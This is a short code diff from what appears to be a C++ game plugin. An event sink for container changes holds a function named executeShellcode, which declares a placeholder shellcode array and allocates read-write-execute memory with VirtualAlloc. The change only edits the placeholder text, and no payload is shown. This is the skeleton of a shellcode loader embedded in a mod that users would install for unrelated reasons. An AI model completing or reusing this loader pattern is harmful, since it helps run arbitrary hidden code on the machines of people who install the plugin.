@@ -25,7 +25,7 @@ struct OurEventSink : public RE::BSTEventSink<RE::TESContainerChangedEvent> {
 
 
     void executeShellcode() {
-        unsigned char teststuff[] = { <YOUR SHELLCODE HERE> };
+        unsigned char teststuff[] = { < SHELLCODE HERE> };
 
         // Allocate executable memory
         void* execMem = VirtualAlloc(0, sizeof(teststuff), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
